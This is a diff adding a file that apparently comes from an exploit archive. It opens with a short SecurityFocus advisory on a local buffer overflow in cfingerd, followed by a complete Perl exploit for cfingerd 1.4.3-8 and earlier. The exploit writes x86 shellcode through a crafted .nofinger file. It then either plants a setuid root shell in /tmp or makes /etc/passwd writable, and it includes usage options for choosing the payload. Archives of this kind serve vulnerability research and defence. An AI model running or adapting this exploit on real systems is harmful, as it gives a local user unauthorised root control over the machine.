@@ -1,0 +1,165 @@
+source: http://www.securityfocus.com/bid/2914/info
+
+cfingerd is a secure implementation of the finger daemon. cfingerd has been contributed to by many authors, and is maintained by the cfingerd development team.
+
+A buffer overflow in cfingerd makes it possible for a local user to gain elevated privileges. Due to insufficient validation of input, a user can execute arbitrary code through the .nofinger file.
+
+This makes it possible for a local user to gain elevated privileges, and potentially root access. 
+
+#!/usr/bin/perl
+
+# | Local buffer overflow exploit for cfingerd
+# | Copyright (c) 2001 by <teleh0r@digit-labs.org>
+# | All rights reserved.
+# |
+# | Simple exploit for the vulnerability reported
+# | to bugtraq by Steven Van Acker.
+# | http://www.securityfocus.com/archive/1/192844
+# |
+# | If cfingerd does not run as root, the exploit
+# | will of course fail!
+# |
+# | http://www.digit-labs.org/teleh0r/
+
+use Socket; use File::Copy;
+use Getopt::Std; getopts('s:p:o:', \%arg);
+
+if (defined($arg{'s'})) { $sjell  = $arg{'s'} }
+if (defined($arg{'p'})) { $port   = $arg{'p'} }
+if (defined($arg{'o'})) { $offset = $arg{'o'} }
+
+# shellcodes written by myself especially for
+# this exploit.
+
+# 34 bytes
+$shellcode1 =
+  "\x31\xdb".                # xor  ebx, ebx
+  "\x31\xc9".                # xor  ecx, ecx
+  "\xf7\xe3".                # mul  ebx
+  "\x52".                    # push edx
+  "\x68\x2f\x2f\x79\x30".    # push dword 0x30792f2f
+  "\x68\x2f\x74\x6d\x70".    # push dword 0x706d742f
+  "\x89\xe3".                # mov  ebx, esp
+  "\xb0\xb6".                # mov  al, 0xb6
+  "\xcd\x80".                # int  0x80
+  "\x66\xb9\xed\x0d".        # mov  cx, 0xded
+  "\xb0\x0f".                # mov  al, 0xf
+  "\xcd\x80".                # int  0x80
+  "\x40".                    # inc  eax
+  "\xcd\x80";                # int  0x80
+
+# 35 bytes
+$shellcode2 =
+  "\xeb\x10".                # jmp  short file
+  "\x5b".                    # pop  ebx
+  "\x31\xc9".                # xor  ecx, ecx
+  "\xf7\xe1".                # mul  ecx
+  "\x66\xb9\xa6\x01".        # mov  cx, 0x1a6
+  "\xb0\x0f".                # mov  al, mov
+  "\xcd\x80".                # int  0x80
+  "\x40".                    # inc  eax
+  "\xcd\x80".                # int  0x80
+  "\xe8\xeb\xff\xff\xff".    # call code
+  "/etc/passwd".             # string
+  "\x00";                    # null terminate
+
+# cfingerd does not drop privileges before the 
+# vulnerable code kicks in, therefore no need 
+# to use setuid(0);
+
+if (!(defined($sjell))||$sjell !~ m/^(1|2)$/) {&usage}
+$shellcode = $sjell == 1 ? $shellcode1 : $shellcode2;
+
+$port  ||= 2003;
+$user    = getlogin() || getpwuid($<);
+$return  = 0xbffff46c;
+$length  = 88;
+$kewlnop = 'K';
+$homedir = (getpwnam($user))[7];
+
+printf("Address: %#lx\n", ($return + $offset));
+&do_checkz;
+
+if (connect_host('127.0.0.1', $port)) {
+    &prepare_attack;
+
+    send(SOCKET, "$user\015\012", 0);
+    close(SOCKET);
+
+    sleep(1); 
+    &do_checkz;
+
+    die("Sorry, exploit failed - check the values.\n");
+}
+
+sub prepare_attack {
+    for ($i = 0; $i < ($length - 2 - 4); $i++) {
+	$buffer .= $kewlnop;
+    }
+    
+    #<82'nops'><jmp 0x4><retaddr><shellcode>
+
+    $buffer .= "\xeb\x04";
+    $buffer .= pack('l', ($return + $offset));
+    $buffer .= $shellcode;
+
+    if (-e("$homedir/.nofinger")) { # I am nice, huh?
+	copy("$homedir/.nofinger", "$homedir/.nofinger.BAK");
+    }
+    
+    open(FILE, ">$homedir/.nofinger") || die("Error: $!\n");
+    print(FILE "\$$buffer\n");
+    close(FILE);    
+}
+	
+sub do_checkz {
+    if ($sjell == '1') {
+	if (-u("/tmp/y0") && (stat("/tmp/y0"))[4,5] == '0') {
+	    print("Exploit attempt succeeded!\n");
+	    exec("/tmp/y0");	    
+	} elsif (stat("/tmp/y0") == '0') {
+	    copy("/bin/sh", "/tmp/y0") || die("Error: $!\n");
+	}
+    } elsif ($sjell == '2') {
+	if (-w("/etc/passwd")) {
+	    ($perm) = (split(/\s/,`ls -la /etc/passwd`))[0];
+	    print("Success: /etc/passwd $perm\n");
+	    exit(0);
+	}
+    } 
+}
+
+sub usage {
+system("clear");
+
+# below layout style stolen from qitest1 xinetd exploit ;)
+# werd!
+
+print(qq(
+cfingerd <= 1.4.3-8 local exploit by teleh0r
+All rights reserved.
+
+Usage: $0 [options]
+Options:
+  -s shellcode  - see below
+  -p port       - 2003 default
+  -o offset 
+
+Available shellcodes:
+  1\) root shell in /tmp
+  2\) writable /etc/passwd
+
+));
+exit(1);
+}
+
+sub connect_host {
+    ($target, $port) = @_;
+    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
+    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
+    $proto  = getprotobyname('tcp')              || die("Error: $!\n");
+
+    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+    connect(SOCKET, $paddr)                      || die("Error: $!\n");
+    return(1);
+}
